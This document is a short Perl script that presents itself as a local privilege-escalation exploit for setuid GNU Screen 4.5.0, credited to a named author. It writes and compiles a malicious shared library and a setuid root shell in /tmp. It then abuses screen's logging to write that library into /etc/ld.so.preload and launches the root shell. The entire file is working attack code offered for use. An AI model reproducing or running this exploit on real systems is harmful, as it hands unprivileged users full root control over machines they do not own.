#!/usr/bin/perl
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# Author : Hoa Nguyen

use warnings;
use strict;

my $filename = "/tmp/libhax.c";
my $rootshell = "/tmp/rootshell.c";
my $payload = <<END;

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
END

my $shell = <<END;
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
END

open(FH,'>',$filename) or die $!;
print FH $payload;

open(FH,'>',$rootshell) or die $!;
print FH $shell;
close(FH);

# Exploit

sub exploit {
system("gcc -fPIC -shared -ldl /tmp/libhax.c -o /tmp/libhax.so");
system("gcc -o /tmp/rootshell /tmp/rootshell.c");
system("cd /etc && umask 000 ");
system("cd /etc && screen -D -m -L ld.so.preload echo -ne  '\x0a/tmp/libhax.so'");
system("screen -ls");
system('/tmp/rootshell');
};

exploit();
